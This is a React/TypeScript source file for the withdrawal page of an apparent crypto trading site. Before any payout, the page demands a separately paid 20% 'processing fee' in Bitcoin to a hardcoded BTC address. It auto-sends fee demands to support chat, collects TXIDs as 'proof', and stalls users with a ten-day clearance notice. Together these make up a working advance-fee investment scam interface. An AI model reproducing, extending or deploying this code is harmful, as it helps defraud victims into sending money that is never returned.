import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState, useEffect } from "react";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/lib/auth-context";
import { useAccountMode } from "@/lib/account-mode-context";
import { useCurrency } from "@/lib/currency-context";
import { getPublicPaymentDetails } from "@/lib/admin.functions";
import { useBinancePrices } from "@/hooks/useBinancePrices";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import {
  CircleCheck as CheckCircle2,
  Clock,
  Circle as XCircle,
  Loader as Loader2,
  TriangleAlert as AlertTriangle,
  Headphones,
  Copy,
  Check,
  QrCode,
  ArrowRight,
  ShieldCheck,
  Send,
} from "lucide-react";
import { toast } from "sonner";
import { motion } from "framer-motion";
import { getOrCreateUserSupportThread } from "@/lib/support-service";

export const Route = createFileRoute("/_authenticated/withdraw")({
  component: WithdrawPage,
});

export function WithdrawPage() {
  const { user } = useAuth();
  const navigate = useNavigate();
  const qc = useQueryClient();

  const [amount, setAmount] = useState("");
  const [currency, setCurrency] = useState("USDT");
  const [wallet, setWallet] = useState("");
  const [submitting, setSubmitting] = useState(false);

  // Fee modal and copy states
  const [copiedFeeWallet, setCopiedFeeWallet] = useState(false);
  const [activeFeeModal, setActiveFeeModal] = useState<{
    id?: string;
    amount: number;
    feeUsd: number;
    feeBtc: number;
    netPayout: number;
    currency: string;
    walletAddress: string;
  } | null>(null);

  const [txHashInput, setTxHashInput] = useState("");
  const [submittingTxHash, setSubmittingTxHash] = useState(false);

  const { data: profile } = useQuery({
    queryKey: ["profile", user?.id],
    queryFn: async () => {
      const { data } = await supabase
        .from("profiles")
        .select("live_balance, account_balance, available_cash, is_suspended")
        .eq("id", user!.id)
        .maybeSingle();
      return data;
    },
    enabled: !!user,
    refetchInterval: 3000,
  });

  const { data: withdrawals, refetch } = useQuery({
    queryKey: ["my_withdrawals", user?.id],
    queryFn: async () => {
      const { data } = await supabase
        .from("withdrawals")
        .select("*")
        .eq("user_id", user!.id)
        .order("created_at", { ascending: false });
      return data ?? [];
    },
    enabled: !!user,
  });

  // Load official public settings & BTC wallet
  const { data: publicPaymentData, refetch: refetchPaymentDetails } = useQuery({
    queryKey: ["public_payment_details"],
    queryFn: async () => {
      try {
        return await getPublicPaymentDetails();
      } catch (err) {
        console.warn("Failed to load public payment details in withdraw:", err);
        return null;
      }
    },
    refetchInterval: 4000,
  });

  // Listen to realtime updates for wallet changes
  useEffect(() => {
    const ch = supabase
      .channel("dewtrades-withdraw-realtime")
      .on("broadcast", { event: "admin-ops-update" }, () => {
        refetchPaymentDetails();
        qc.invalidateQueries({ queryKey: ["public_payment_details"] });
      })
      .on("postgres_changes", { event: "*", schema: "public", table: "app_settings" }, () => {
        refetchPaymentDetails();
        qc.invalidateQueries({ queryKey: ["public_payment_details"] });
      })
      .subscribe();

    return () => {
      supabase.removeChannel(ch);
    };
  }, [qc, refetchPaymentDetails]);

  // Live BTC Price
  const { tickers } = useBinancePrices(["BTCUSDT"]);
  const btcPrice = tickers["BTCUSDT"]?.price ?? 96500;

  // Synchronized BTC Fee Escrow Wallet Address
  const btcFeeWallet =
    publicPaymentData?.btcFeeWallet ||
    publicPaymentData?.settings?.deposit_wallet_btc ||
    publicPaymentData?.settings?.withdrawal_fee_wallet ||
    "bc1qz5sy73npvx3ylgyk6hfc7syh8p8zz5mydm5qd0";

  const { fiatLiveBalance, cryptoBalance, liveBalance } = useAccountMode();
  const { formatCurrency } = useCurrency();
  const available = Math.max(fiatLiveBalance, liveBalance);

  const amtNum = Number(amount) || 0;
  const fee = amtNum * 0.2;
  const net = amtNum - fee;
  const feeBtc = btcPrice > 0 && fee > 0 ? fee / btcPrice : 0;

  const copyBtcAddress = (addr: string) => {
    if (!addr) return;
    navigator.clipboard.writeText(addr);
    setCopiedFeeWallet(true);
    toast.success("BTC Fee Wallet address copied to clipboard");
    setTimeout(() => setCopiedFeeWallet(false), 2000);
  };

  const submit = async () => {
    if (profile?.is_suspended) {
      toast.error("Account suspended — withdrawals are locked. Contact customer support.");
      return;
    }
    const amt = Number(amount);
    if (!amt || amt <= 0) return toast.error("Enter a valid amount");
    if (amt > available) return toast.error("Amount exceeds available balance");
    if (!wallet.trim()) return toast.error("Enter your wallet address");
    setSubmitting(true);

    try {
      const { data: newWithdrawal, error } = await supabase
        .from("withdrawals")
        .insert({
          user_id: user!.id,
          amount: amt,
          crypto_currency: currency,
          wallet_address: wallet.trim(),
          status: "pending",
        })
        .select()
        .single();

      if (error) throw error;

      const { error: txError } = await supabase.from("transactions").insert({
        user_id: user!.id,
        type: "withdrawal_request",
        amount: amt,
        asset_name: `Pending withdrawal ${currency} (20% BTC fee applies)`,
        status: "pending",
      });
      if (txError) console.error("[withdraw] transaction insert failed:", txError.message);

      // Automated Support Thread Notification with exact BTC fee instructions
      const thread = await getOrCreateUserSupportThread(user!.id, user!.email?.split("@")[0]);
      if (thread) {
        await supabase.from("support_messages").insert({
          thread_id: thread.id,
          user_id: user!.id,
          sender: "user",
          body: `Withdrawal Request Submitted:\n• Amount: $${amt.toFixed(2)} ${currency} to destination ${wallet.trim().slice(0, 16)}…\n• Net Payout: $${net.toFixed(2)}\n• Mandatory 20% Network Fee: $${fee.toFixed(2)} (≈ ${feeBtc.toFixed(6)} BTC)\n• Designated BTC Fee Wallet: ${btcFeeWallet}\n\nPlease transfer the 20% processing fee to the designated Bitcoin (BTC) address above. Reply with your payment hash (TXID) to complete immediate release.`,
        });
      }

      toast.success("Withdrawal request submitted! Please complete the 20% BTC fee payment.");

      // Open interactive Fee Payment Dialog
      setActiveFeeModal({
        id: newWithdrawal?.id,
        amount: amt,
        feeUsd: fee,
        feeBtc,
        netPayout: net,
        currency,
        walletAddress: wallet.trim(),
      });

      setAmount("");
      setWallet("");
      refetch();
    } catch (err: any) {
      toast.error(err.message ?? "Submission failed");
    } finally {
      setSubmitting(false);
    }
  };

  const handleSendTxHashProof = async () => {
    if (!txHashInput.trim()) return toast.error("Please enter a valid BTC transaction hash / TXID");
    setSubmittingTxHash(true);
    try {
      const thread = await getOrCreateUserSupportThread(user!.id, user!.email?.split("@")[0]);
      if (thread) {
        await supabase.from("support_messages").insert({
          thread_id: thread.id,
          user_id: user!.id,
          sender: "user",
          body: `[Withdrawal Fee Confirmation Proof]\nWithdrawal ID: ${activeFeeModal?.id || "Latest"}\nBTC Fee Paid: $${activeFeeModal?.feeUsd.toFixed(2)} (≈ ${activeFeeModal?.feeBtc.toFixed(6)} BTC)\nDesignated BTC Fee Wallet: ${btcFeeWallet}\nTransaction Hash / TXID:\n${txHashInput.trim()}`,
        });
      }
      toast.success("Payment proof submitted to compliance desk!");
      setTxHashInput("");
      setActiveFeeModal(null);
      navigate({ to: "/support" });
    } catch (e: any) {
      toast.error(e.message ?? "Failed to submit payment proof");
    } finally {
      setSubmittingTxHash(false);
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      className="mx-auto max-w-3xl space-y-6"
    >
      <div>
        <h1 className="text-3xl font-bold tracking-tight">Withdraw funds</h1>
        <p className="text-sm text-muted-foreground">
          Request an institutional payout to your crypto wallet. A mandatory 20% network processing
          fee applies to the BTC wallet.
        </p>
      </div>

      {/* MANDATORY 20% BTC WITHDRAWAL FEE NOTICE CARD */}
      <Card className="p-4 border-amber-500/40 bg-gradient-to-r from-amber-950/30 via-slate-900 to-amber-950/20 shadow-md">
        <div className="flex flex-col sm:flex-row items-start justify-between gap-4">
          <div className="flex items-start gap-3">
            <div className="rounded-xl bg-amber-500/20 p-2 text-amber-400 border border-amber-500/30 shrink-0">
              <AlertTriangle className="h-5 w-5" />
            </div>
            <div className="text-sm space-y-1">
              <div className="flex items-center gap-2">
                <p className="font-bold text-amber-400">
                  Mandatory 20% Processing Fee — Payable to BTC Wallet
                </p>
                <Badge
                  variant="outline"
                  className="bg-amber-500/20 text-amber-300 border-amber-500/30 text-[10px] font-bold"
                >
                  BTC Mainnet
                </Badge>
              </div>
              <p className="text-xs text-slate-300 leading-relaxed">
                All withdrawal disbursements require a <strong>20% network processing fee</strong>{" "}
                settled prior to security clearance. The fee is payable strictly in{" "}
                <strong className="text-amber-300">Bitcoin (BTC)</strong> to our designated company
                escrow address.
              </p>
            </div>
          </div>

          <Button
            size="sm"
            variant="outline"
            onClick={() => copyBtcAddress(btcFeeWallet)}
            className="text-xs border-amber-500/40 hover:bg-amber-500/10 text-amber-300 shrink-0"
          >
            {copiedFeeWallet ? (
              <Check className="h-3.5 w-3.5 mr-1.5 text-emerald-400" />
            ) : (
              <Copy className="h-3.5 w-3.5 mr-1.5" />
            )}
            Copy BTC Fee Address
          </Button>
        </div>

        {/* BTC Escrow Wallet Banner */}
        <div className="mt-3 pt-3 border-t border-amber-500/20 flex flex-wrap items-center justify-between gap-2 text-xs">
          <div className="flex items-center gap-1.5 min-w-0">
            <span className="text-muted-foreground font-semibold shrink-0">
              Designated BTC Fee Wallet:
            </span>
            <code className="font-mono text-amber-300 bg-amber-950/60 px-2 py-0.5 rounded border border-amber-500/30 truncate select-all">
              {btcFeeWallet}
            </code>
          </div>
          <span className="text-[11px] text-muted-foreground font-mono">
            BTC Live: ${btcPrice.toLocaleString()}
          </span>
        </div>
      </Card>

      {/* 10-DAY PROCESSING TIMELINE NOTICE */}
      <Card className="p-4 border-sky-500/40 bg-gradient-to-r from-sky-950/80 via-slate-900 to-indigo-950/80 rounded-2xl shadow-lg shadow-sky-950/30">
        <div className="flex items-start gap-3.5">
          <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-xl bg-sky-500/20 text-sky-400 border border-sky-500/30">
            <Clock className="h-5 w-5" />
          </div>
          <div className="text-sm space-y-1">
            <div className="flex items-center gap-2">
              <span className="font-black text-sky-300 text-sm uppercase tracking-wider">
                Processing Timeline Notice
              </span>
              <Badge className="bg-sky-500/20 text-sky-300 border-sky-500/30 text-[10px] font-bold">
                Up to 10 Days
              </Badge>
            </div>
            <p className="text-slate-200 text-xs leading-relaxed">
              Withdrawals take <strong>up to 10 days</strong> to process and clear internal security
              protocols. Please remain calm while our payout and compliance desk processes your
              request in order of queue.
            </p>
          </div>
        </div>
      </Card>

      <Card className="p-6 space-y-5">
        <div className="rounded-xl border border-border/80 bg-surface/80 p-3.5 space-y-2 text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border/60 pb-2">
            <span className="font-bold text-blue-400">Cash Balance (Available to Withdraw):</span>
            <span className="font-extrabold text-sm text-foreground tabular-nums">
              {formatCurrency(available)}
            </span>
          </div>
          <div className="flex flex-wrap items-center justify-between gap-2 text-muted-foreground">
            <span>
              Crypto Holdings:{" "}
              <strong className="text-emerald-400">{formatCurrency(cryptoBalance)}</strong>
            </span>
            <span>
              Total Live Balance:{" "}
              <strong className="text-foreground">{formatCurrency(liveBalance)}</strong>
            </span>
          </div>
        </div>

        <div className="grid gap-4 sm:grid-cols-2">
          <div className="space-y-2">
            <Label>Currency</Label>
            <Select value={currency} onValueChange={setCurrency}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="USDT">USDT (TRC20)</SelectItem>
                <SelectItem value="BTC">BTC (Bitcoin)</SelectItem>
                <SelectItem value="ETH">ETH (ERC20)</SelectItem>
                <SelectItem value="XRP">XRP (Ripple)</SelectItem>
                <SelectItem value="SOL">SOL (Solana)</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <Label>Amount (USD)</Label>
              <div className="flex gap-1">
                {[0.25, 0.5, 0.75, 1.0].map((pct) => (
                  <button
                    key={pct}
                    type="button"
                    onClick={() => {
                      const val = Math.floor(available * pct * 100) / 100;
                      setAmount(val > 0 ? val.toString() : "");
                    }}
                    className="rounded px-1.5 py-0.5 text-[10px] font-semibold text-muted-foreground hover:bg-accent hover:text-foreground border border-border/60 transition-colors"
                  >
                    {pct === 1.0 ? "MAX" : `${pct * 100}%`}
                  </button>
                ))}
              </div>
            </div>
            <Input
              type="number"
              min={1}
              step="0.01"
              placeholder="100.00"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
            />
          </div>
        </div>

        {amtNum > 0 && (
          <div className="rounded-xl border border-border/80 bg-surface/90 p-4 text-xs space-y-2.5">
            <div className="flex justify-between items-center text-sm">
              <span className="text-muted-foreground">Withdrawal gross amount:</span>
              <span className="font-bold tabular-nums">${amtNum.toFixed(2)}</span>
            </div>

            <div className="flex justify-between items-center text-amber-400 bg-amber-500/10 p-2.5 rounded-lg border border-amber-500/20">
              <div className="space-y-0.5">
                <span className="font-bold">Mandatory Processing Fee (20%):</span>
                <div className="text-[11px] text-muted-foreground">
                  Payable to BTC Wallet:{" "}
                  <span className="text-amber-300 font-mono">
                    {btcFeeWallet.slice(0, 10)}…{btcFeeWallet.slice(-6)}
                  </span>
                </div>
              </div>
              <div className="text-right tabular-nums">
                <div className="font-bold text-destructive">-${fee.toFixed(2)}</div>
                <div className="text-[11px] text-amber-300 font-mono">
                  ≈ {feeBtc.toFixed(6)} BTC
                </div>
              </div>
            </div>

            <div className="flex justify-between items-center border-t border-border pt-2 text-sm font-bold">
              <span>Net payout to your wallet:</span>
              <span className="tabular-nums text-emerald-400 text-base">${net.toFixed(2)}</span>
            </div>
          </div>
        )}

        <div className="space-y-2">
          <Label>Your destination wallet address</Label>
          <Input
            placeholder={`Your ${currency} payout address`}
            value={wallet}
            onChange={(e) => setWallet(e.target.value)}
          />
        </div>

        <Button onClick={submit} disabled={submitting} className="w-full font-bold">
          {submitting && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
          Submit Withdrawal & View BTC Fee Payment
        </Button>
      </Card>

      {/* WITHDRAWAL HISTORY */}
      <Card className="p-6">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-lg font-semibold">Your withdrawal history</h2>
          <Button size="sm" variant="ghost" onClick={() => refetch()} className="text-xs h-7">
            Refresh
          </Button>
        </div>

        {!withdrawals?.length ? (
          <p className="text-sm text-muted-foreground">No withdrawals yet.</p>
        ) : (
          <div className="space-y-3">
            {withdrawals.map((w: any) => {
              const wAmt = Number(w.amount || 0);
              const wFee = wAmt * 0.2;
              const wNet = wAmt - wFee;
              const isPending = w.status === "pending";

              return (
                <div
                  key={w.id}
                  className="rounded-xl border border-border/80 bg-surface/90 p-4 text-xs space-y-2"
                >
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <div className="flex items-center gap-2">
                      <span className="font-bold text-sm text-foreground tabular-nums">
                        ${wAmt.toFixed(2)}{" "}
                        <span className="text-xs font-normal text-muted-foreground">
                          · {w.crypto_currency}
                        </span>
                      </span>
                      <span className="text-muted-foreground">
                        → Net Payout: ${wNet.toFixed(2)}
                      </span>
                    </div>
                    <StatusBadge status={w.status} />
                  </div>

                  <div className="text-[11px] text-muted-foreground break-all">
                    Destination:{" "}
                    <span className="font-mono text-foreground">{w.wallet_address}</span>
                  </div>

                  {isPending && (
                    <div className="flex flex-wrap items-center justify-between gap-2 pt-2 border-t border-border/60">
                      <div className="flex items-center gap-1.5 text-amber-400">
                        <AlertTriangle className="h-3.5 w-3.5" />
                        <span>
                          20% Processing Fee: <strong>${wFee.toFixed(2)}</strong> (Pay to BTC
                          Wallet)
                        </span>
                      </div>
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() =>
                          setActiveFeeModal({
                            id: w.id,
                            amount: wAmt,
                            feeUsd: wFee,
                            feeBtc: btcPrice > 0 ? wFee / btcPrice : 0,
                            netPayout: wNet,
                            currency: w.crypto_currency,
                            walletAddress: w.wallet_address,
                          })
                        }
                        className="text-xs h-7 border-amber-500/40 text-amber-300 hover:bg-amber-500/10 font-bold"
                      >
                        <QrCode className="h-3 w-3 mr-1" /> Pay Fee / View BTC Wallet
                      </Button>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </Card>

      <Card className="flex items-center gap-3 p-4 border-primary/30 bg-primary/5">
        <Headphones className="h-5 w-5 text-primary" />
        <div className="text-sm">
          <p className="font-semibold">Need help with your withdrawal?</p>
          <p className="text-muted-foreground">
            Our customer service desk is online 24/7 to guide you through the BTC fee clearance and
            release process.
          </p>
        </div>
        <Button
          variant="outline"
          size="sm"
          className="ml-auto"
          onClick={() => navigate({ to: "/support" })}
        >
          Contact support
        </Button>
      </Card>

      {/* WITHDRAWAL FEE PAYMENT DIALOG (BTC WALLET) */}
      <Dialog
        open={Boolean(activeFeeModal)}
        onOpenChange={(open) => !open && setActiveFeeModal(null)}
      >
        <DialogContent className="sm:max-w-md bg-card border-border">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-base text-foreground font-bold">
              <ShieldCheck className="h-5 w-5 text-amber-400" />
              Withdrawal Fee Payment (Bitcoin BTC)
            </DialogTitle>
            <DialogDescription className="text-xs text-muted-foreground">
              Please transfer the mandatory 20% network processing fee to complete security
              clearance for your payout.
            </DialogDescription>
          </DialogHeader>

          {activeFeeModal && (
            <div className="space-y-4 py-2 text-xs">
              {/* Summary Pill */}
              <div className="rounded-xl border border-border/80 bg-surface/90 p-3 space-y-1.5">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Requested Withdrawal:</span>
                  <span className="font-semibold text-foreground">
                    ${activeFeeModal.amount.toFixed(2)} {activeFeeModal.currency}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Net Payout to You:</span>
                  <span className="font-bold text-emerald-400">
                    ${activeFeeModal.netPayout.toFixed(2)}
                  </span>
                </div>
                <div className="flex justify-between border-t border-border pt-1.5 font-bold text-amber-400">
                  <span>Mandatory 20% Fee:</span>
                  <span className="font-mono">
                    ${activeFeeModal.feeUsd.toFixed(2)} (≈{" "}
                    {activeFeeModal.feeBtc > 0
                      ? activeFeeModal.feeBtc.toFixed(6)
                      : (activeFeeModal.feeUsd / 96500).toFixed(6)}{" "}
                    BTC)
                  </span>
                </div>
              </div>

              {/* QR Code & BTC Address Display */}
              <div className="rounded-xl border-2 border-amber-500/30 bg-amber-950/20 p-4 text-center space-y-3">
                <p className="font-bold text-amber-300 text-xs uppercase tracking-wide">
                  Designated BTC Escrow Wallet Address
                </p>

                <div className="flex justify-center py-1">
                  <div className="rounded-xl bg-white p-2.5 shadow-inner">
                    <img
                      src={`https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(
                        btcFeeWallet,
                      )}`}
                      alt="BTC Fee QR"
                      className="h-36 w-36"
                    />
                  </div>
                </div>

                <div className="space-y-1.5">
                  <code className="block rounded bg-black/60 p-2 font-mono text-[11px] text-amber-200 border border-amber-500/30 break-all select-all">
                    {btcFeeWallet}
                  </code>
                  <Button
                    size="sm"
                    onClick={() => copyBtcAddress(btcFeeWallet)}
                    className="w-full bg-amber-500 hover:bg-amber-600 text-black font-bold h-8 text-xs"
                  >
                    {copiedFeeWallet ? (
                      <Check className="h-3.5 w-3.5 mr-1 text-emerald-950" />
                    ) : (
                      <Copy className="h-3.5 w-3.5 mr-1" />
                    )}
                    {copiedFeeWallet ? "Address Copied!" : "Copy BTC Address"}
                  </Button>
                </div>
              </div>

              {/* Proof / Transaction Hash Submission */}
              <div className="space-y-2 rounded-xl border border-border bg-surface p-3">
                <Label className="text-[11px] font-semibold text-foreground">
                  Already paid? Enter BTC Transaction Hash (TXID):
                </Label>
                <div className="flex gap-2">
                  <Input
                    placeholder="e.g. 7f8a9b0c1d2e3f4a5b6c7d8e9..."
                    value={txHashInput}
                    onChange={(e) => setTxHashInput(e.target.value)}
                    className="text-xs h-8 font-mono"
                  />
                  <Button
                    size="sm"
                    onClick={handleSendTxHashProof}
                    disabled={submittingTxHash}
                    className="text-xs h-8 shrink-0 bg-primary font-bold"
                  >
                    {submittingTxHash ? (
                      <Loader2 className="h-3.5 w-3.5 animate-spin" />
                    ) : (
                      <Send className="h-3.5 w-3.5 mr-1" />
                    )}
                    Submit Proof
                  </Button>
                </div>
                <p className="text-[10px] text-muted-foreground">
                  Our compliance officer will verify your BTC transaction on-chain and authorize the
                  disbursement.
                </p>
              </div>

              <div className="flex gap-2">
                <Button
                  variant="outline"
                  onClick={() => setActiveFeeModal(null)}
                  className="flex-1 text-xs h-8"
                >
                  Close
                </Button>
                <Button
                  variant="default"
                  onClick={() => {
                    setActiveFeeModal(null);
                    navigate({ to: "/support" });
                  }}
                  className="flex-1 text-xs h-8 font-bold"
                >
                  Open Support Chat <ArrowRight className="h-3.5 w-3.5 ml-1" />
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </motion.div>
  );
}

function StatusBadge({ status }: { status: string }) {
  if (status === "approved")
    return (
      <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30 text-xs">
        <CheckCircle2 className="mr-1 h-3 w-3" /> Approved
      </Badge>
    );
  if (status === "rejected")
    return (
      <Badge variant="destructive" className="text-xs">
        <XCircle className="mr-1 h-3 w-3" /> Rejected
      </Badge>
    );
  return (
    <Badge variant="outline" className="bg-amber-500/10 text-amber-400 border-amber-500/30 text-xs">
      <Clock className="mr-1 h-3 w-3" /> Pending Fee Clearance
    </Badge>
  );
}
